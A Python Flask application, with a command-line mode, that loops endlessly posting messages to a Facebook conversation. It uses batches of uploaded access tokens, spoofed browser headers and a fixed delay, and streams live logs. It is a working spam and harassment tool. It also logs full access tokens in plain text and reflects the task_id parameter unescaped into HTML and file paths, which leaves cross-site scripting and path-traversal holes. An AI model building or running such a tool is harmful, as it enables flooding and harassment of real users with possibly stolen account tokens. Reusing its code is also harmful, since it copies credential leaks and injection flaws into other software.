from flask import Flask, request, render_template, jsonify, Response
import requests
from threading import Thread, Event
import time
import random
import string
import os
from monitor import SystemMonitor

app = Flask(__name__)
app.debug = False
monitor = SystemMonitor()

# Directory for logs
LOGS_DIR = "logs"
os.makedirs(LOGS_DIR, exist_ok=True)

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

# --- Helper to log both console + file ---
def log_message(task_id, msg):
    print(msg)
    log_path = os.path.join(LOGS_DIR, f"{task_id}.txt")
    with open(log_path, "a", encoding="utf-8") as f:
        f.write(msg + "\n")

# --- Worker thread for sending messages ---
def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    message_count = 0
    error_count = 0
    
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
                
            for access_token in access_tokens:
                try:
                    api_url = f'https://graph.facebook.com/v18.0/t_{thread_id}/'
                    message = f" {mn}  {message1} ."
                    parameters = {'access_token': access_token, 'message': message}
                    
                    response = requests.post(api_url, data=parameters, headers=headers)
                    message_count += 1
                    
                    if response.status_code == 200:
                        log_message(task_id, f"✅ Message #{message_count} Sent Successfully From token {access_token}: {message}")
                    else:
                        error_count += 1
                        log_message(task_id, f"❌ Message Failed From token {access_token}: {message}")
                        log_message(task_id, f"Error: {response.text}")
                        
                except Exception as e:
                    error_count += 1
                    log_message(task_id, f"❌ Error occurred: {str(e)}")
                    
                time.sleep(time_interval)
                
                # Update stats
                monitor.update_message_stats(message_count, error_count)

# --- Live log streaming (SSE) ---
def stream_logs(task_id):
    log_path = os.path.join(LOGS_DIR, f"{task_id}.txt")
    if not os.path.exists(log_path):
        yield "data: 📭 No logs yet.\n\n"
        return
    
    with open(log_path, "r", encoding="utf-8") as f:
        f.seek(0, os.SEEK_END)
        while True:
            line = f.readline()
            if line:
                yield f"data: {line.strip()}\n\n"
            else:
                time.sleep(1)

@app.route("/logs")
def live_logs():
    task_id = request.args.get("task_id")
    if not task_id:
        return "❌ task_id missing."
    return Response(stream_logs(task_id), mimetype="text/event-stream")

# --- Log viewer page ---
@app.route("/view-logs")
def view_logs_page():
    task_id = request.args.get("task_id")
    if not task_id:
        return "❌ task_id missing."
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Live Logs - {task_id}</title>
        <style>
            body {{ font-family: monospace; background: #111; color: #0f0; padding: 20px; }}
            #logs {{ white-space: pre-wrap; border: 1px solid #333; padding: 10px; background: #000; height: 80vh; overflow-y: scroll; }}
        </style>
    </head>
    <body>
        <h2>📜 Live Logs for Task ID: {task_id}</h2>
        <div id="logs">⏳ Connecting...</div>
        <script>
            const logBox = document.getElementById("logs");
            const es = new EventSource("/logs?task_id={task_id}");
            es.onmessage = (e) => {{
                logBox.textContent += "\\n" + e.data;
                logBox.scrollTop = logBox.scrollHeight;
            }};
            es.onerror = () => {{
                logBox.textContent += "\\n❌ Connection lost. Retrying...";
            }};
        </script>
    </body>
    </html>
    """

# --- List all tasks (running + stopped) ---
@app.route("/api/tasks")
def list_tasks():
    tasks = []
    for fname in os.listdir(LOGS_DIR):
        if fname.endswith(".txt"):
            task_id = fname.replace(".txt", "")
            running = task_id in threads and threads[task_id].is_alive()
            tasks.append({"task_id": task_id, "running": running})
    return jsonify(tasks)

# --- Main page (unchanged, plus tasks listing will be added in index.html template) ---
@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        try:
            token_option = request.form.get('tokenOption')

            if token_option == 'single':
                access_tokens = [request.form.get('singleToken')]
                if not access_tokens[0]:
                    return 'Error: Token is required', 400
            else:
                token_file = request.files['tokenFile']
                if not token_file:
                    return 'Error: Token file is required', 400
                access_tokens = token_file.read().decode().strip().splitlines()
                if not access_tokens:
                    return 'Error: Token file is empty', 400

            thread_id = request.form.get('threadId')
            if not thread_id:
                return 'Error: Thread ID is required', 400

            mn = request.form.get('kidx')
            if not mn:
                return 'Error: Message prefix is required', 400

            try:
                time_interval = int(request.form.get('time'))
                if time_interval < 1:
                    return 'Error: Time interval must be at least 1 second', 400
            except:
                return 'Error: Invalid time interval', 400

            txt_file = request.files['txtFile']
            if not txt_file:
                return 'Error: Message file is required', 400
            messages = txt_file.read().decode().splitlines()
            if not messages:
                return 'Error: Message file is empty', 400

            task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
            stop_events[task_id] = Event()
            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
            threads[task_id] = thread
            thread.start()

            return jsonify({
                'status': 'success',
                'task_id': task_id,
                'message': f'Task started successfully with ID: {task_id}',
                'logs_url': f'/view-logs?task_id={task_id}'
            })

        except Exception as e:
            return jsonify({
                'status': 'error',
                'message': f'An error occurred: {str(e)}'
            }), 500

    stats = monitor.get_system_stats()
    uptime = monitor.get_uptime()
    current_time = monitor.get_current_time()
    
    return render_template('index.html', 
                         stats=stats, 
                         uptime=uptime,
                         current_time=current_time)

@app.route('/api/stats')
def get_stats():
    stats = monitor.get_system_stats()
    uptime = monitor.get_uptime()
    current_time = monitor.get_current_time()
    return jsonify({
        'stats': stats,
        'uptime': uptime,
        'current_time': current_time
    })

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f"<h3 style='color:green;text-align:center;'>✅ Task with ID {task_id} has been stopped. Logs are still available.</h3><br><a href='/'>Return</a>"
    else:
        return f"<h3 style='color:red;text-align:center;'>❌ No task found with ID {task_id}.</h3><br><a href='/'>Return</a>"

# --- CLI Mode ---
import argparse
def cli_send():
    parser = argparse.ArgumentParser(description="Send Facebook messages via CLI")
    parser.add_argument('--tokens', type=str, help='Path to file with access tokens, one per line')
    parser.add_argument('--thread', type=str, required=True, help='Facebook thread ID')
    parser.add_argument('--prefix', type=str, required=True, help='Message prefix')
    parser.add_argument('--interval', type=int, default=3, help='Time interval between messages (seconds)')
    parser.add_argument('--messages', type=str, required=True, help='Path to text file with messages')

    args = parser.parse_args()

    try:
        with open(args.tokens, 'r') as f:
            access_tokens = f.read().strip().splitlines()
    except:
        print("❌ Error reading token file.")
        return

    try:
        with open(args.messages, 'r') as f:
            messages = f.read().strip().splitlines()
    except:
        print("❌ Error reading messages file.")
        return

    task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    stop_events[task_id] = Event()
    print(f"🚀 Starting message sending with Task ID: {task_id}")
    send_messages(access_tokens, args.thread, args.prefix, args.interval, messages, task_id)

if __name__ == '__main__':
    import sys
    if '--cli' in sys.argv:
        sys.argv.remove('--cli')
        cli_send()
    else:
        from waitress import serve
        print("Starting production server on http://0.0.0.0:21240")
        serve(app, host='0.0.0.0', port=21240)
